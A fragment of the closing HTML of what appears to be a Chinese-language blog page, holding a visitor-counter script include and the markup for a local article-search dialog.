})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>